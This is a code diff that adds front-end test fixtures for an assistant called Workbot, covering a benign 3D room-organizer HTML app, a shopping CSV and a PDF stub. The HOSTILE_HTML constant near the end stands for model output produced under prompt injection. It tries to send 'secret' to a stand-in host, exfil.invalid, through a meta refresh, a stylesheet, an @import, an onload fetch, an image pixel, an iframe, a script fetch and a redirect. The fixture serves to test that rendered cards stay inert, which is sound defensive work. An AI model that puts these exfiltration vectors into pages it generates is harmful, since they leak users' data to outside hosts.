@@ -17,6 +17,7 @@ export type FixtureTurn = {
   error: string | null
   tasks?: unknown[]
   greeting?: boolean
+  outputs?: Array<{ id: string; name: string; mediaType: string; size: number; updatedAt?: number }>
 }
 export type FixtureThread = { name: string; organizationName: string; status: "idle" | "busy"; turns: FixtureTurn[]; hasEarlier: boolean; filesEnabled: boolean }
 
@@ -95,6 +96,24 @@ export const scenarios: Record<string, () => FixtureThread> = {
       said("I checked the research and your team's notes. The next steps are in Linear."),
       { kind: "steps", steps: ["Exa", "Exa", "Google Drive", "Linear", "Slack", "GitHub", "PlanetScale", "Research"].map((app) => ({ ...appStep(`Checking ${app}`, app, false, ago(20)), detail: "Read notes" })) },
     ])],
+  }),
+  /** Files Workbot made: an interactive app (a live thumbnail), then a report and a spreadsheet (placeholders by type). */
+  artifacts: () => ({
+    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
+    turns: [
+      hello(),
+      turn("a1", "Code me an app that organizes my space in 3D", minutesAgo(8), [said("Here's your 3D space organizer. Drag the boxes to plan the room; the shelf list on the right updates as you go.")], {
+        outputs: [ARTIFACT_FILES.organizer],
+      }),
+      turn("a2", "Can you also write up the plan and the shopping list?", minutesAgo(3), [said("Done: the plan is in the report and the shopping list is a spreadsheet.")], {
+        outputs: [ARTIFACT_FILES.report, ARTIFACT_FILES.shopping],
+      }),
+    ],
+  }),
+  /** An app that tries to reach the network and navigate by itself: its card must do neither until it is opened. */
+  "artifact-hostile": () => ({
+    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
+    turns: [hello(), turn("h1", "Summarize my inbox as a page", minutesAgo(2), [said("Here's the summary page.")], { outputs: [ARTIFACT_FILES.hostile] })],
   }),
   /** Short and long messages from the person (#1, #2): "Hey" must stay on one line. */
   bubbles: () => ({
@@ -203,3 +222,46 @@ export const GOOGLE_EVENTS = [
   { type: "working", messageId: "g1", step: 0, on: "computer", surface: "browser" },
   { type: "working", messageId: "g1", step: 0, on: "computer", surface: "browser", update: "Opening google.com" },
 ]
+
+/** A small interactive app, as Workbot writes one: its <title> names the card. */
+const ORGANIZER_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>3D Space Organizer</title>
+<style>
+body{margin:0;font:13px/1.4 system-ui,sans-serif;background:linear-gradient(180deg,#eef3f8,#dfe8f1);color:#11181c;height:100vh;display:flex}
+main{flex:1;display:grid;place-items:center;perspective:1200px}
+.room{width:420px;height:300px;position:relative;transform:rotateX(58deg) rotateZ(-38deg);transform-style:preserve-3d;background:#fdfdfd;box-shadow:0 30px 60px -20px #01162744;border-radius:6px;
+  background-image:linear-gradient(#0116270f 1px,transparent 1px),linear-gradient(90deg,#0116270f 1px,transparent 1px);background-size:30px 30px}
+.box{position:absolute;transform-style:preserve-3d;cursor:grab;border-radius:3px}
+.box::before{content:"";position:absolute;inset:0;transform:translateZ(var(--h));background:inherit;filter:brightness(1.08);border-radius:3px}
+aside{width:220px;background:#fff;border-left:1px solid #0116270f;padding:20px}
+h1{font-size:15px;margin:0 0 12px}li{display:flex;gap:8px;align-items:center;padding:6px 0;border-bottom:1px solid #0116270d}
+i{width:10px;height:10px;border-radius:3px;display:inline-block}ul{list-style:none;margin:0;padding:0}
+@media(max-width:700px){body{flex-direction:column}.room{width:300px;height:220px}aside{width:auto;border-left:0;border-top:1px solid #0116270f}}
+</style></head><body><main><div class="room" id="room"><div class="box" style="left:20px;top:20px;width:60px;height:180px;background:#5b8def;--h:80px"></div><div class="box" style="left:120px;top:30px;width:150px;height:70px;background:#f0a35e;--h:40px"></div><div class="box" style="left:300px;top:40px;width:80px;height:80px;background:#4fb38a;--h:50px"></div><div class="box" style="left:130px;top:200px;width:170px;height:70px;background:#a78bdb;--h:30px"></div><div class="box" style="left:340px;top:220px;width:40px;height:40px;background:#7cc36b;--h:60px"></div></div></main>
+<aside><h1>Shelves and storage</h1><ul>
+<li><i style="background:#5b8def"></i>Bookshelf</li><li><i style="background:#f0a35e"></i>Desk</li><li><i style="background:#4fb38a"></i>Storage bins</li><li><i style="background:#a78bdb"></i>Sofa</li><li><i style="background:#7cc36b"></i>Plant</li></ul></aside>
+<script>
+for(const b of document.querySelectorAll(".box"))b.onpointerdown=e=>{b.setPointerCapture(e.pointerId);const sx=e.clientX,sy=e.clientY,ox=b.offsetLeft,oy=b.offsetTop;b.onpointermove=m=>{b.style.left=ox+(m.clientX-sx)+"px";b.style.top=oy+(m.clientY-sy)+"px"};b.onpointerup=()=>{b.onpointermove=null}}
+</script></body></html>`
+
+/** Model-written HTML that tries to send what it holds elsewhere the moment it renders (prompt injection). */
+const HOSTILE_HTML = `<!doctype html><html><head><title>Inbox summary</title><meta http-equiv="refresh" content="0;url=http://exfil.invalid/refresh?d=secret">
+<link rel="stylesheet" href="http://exfil.invalid/style.css"><style>@import url(http://exfil.invalid/import.css);body{font:14px system-ui;padding:24px}</style></head>
+<body onload="fetch('http://exfil.invalid/onload?d=secret')"><h1>Inbox summary</h1><p>Three threads need a reply today: the vendor invoice, the offsite plan and the hiring loop.</p>
+<img src="http://exfil.invalid/pixel.png?d=secret" alt=""><iframe src="http://exfil.invalid/frame"></iframe>
+<script>fetch("http://exfil.invalid/script?d=secret");location.href="http://exfil.invalid/navigate?d=secret"</script></body></html>`
+
+const SHOPPING_CSV = "Item,Where,Price\nWall shelf (120cm),Furniture store,49\nStorage bins x4,Home store,36\nDesk lamp,Lighting shop,29\nPlant stand,Furniture store,19\n"
+
+/** Bytes for the files the "artifacts" scenario made, served at /v1/workbot/files/:id. */
+export const ARTIFACT_BYTES: Record<string, { mediaType: string; bytes: string }> = {
+  "out-organizer": { mediaType: "text/html", bytes: ORGANIZER_HTML },
+  "out-hostile": { mediaType: "text/html", bytes: HOSTILE_HTML },
+  "out-report": { mediaType: "application/pdf", bytes: "%PDF-1.4\n% fixture\n" },
+  "out-shopping": { mediaType: "text/csv", bytes: SHOPPING_CSV },
+}
+const ARTIFACT_FILES = {
+  organizer: { id: "out-organizer", name: "space-organizer.html", mediaType: "text/html", size: ORGANIZER_HTML.length, updatedAt: 1 },
+  hostile: { id: "out-hostile", name: "inbox-summary.html", mediaType: "text/html", size: HOSTILE_HTML.length, updatedAt: 1 },
+  report: { id: "out-report", name: "Room plan.pdf", mediaType: "application/pdf", size: 48_211, updatedAt: 1 },
+  shopping: { id: "out-shopping", name: "Shopping list.csv", mediaType: "text/csv", size: SHOPPING_CSV.length, updatedAt: 1 },
+}
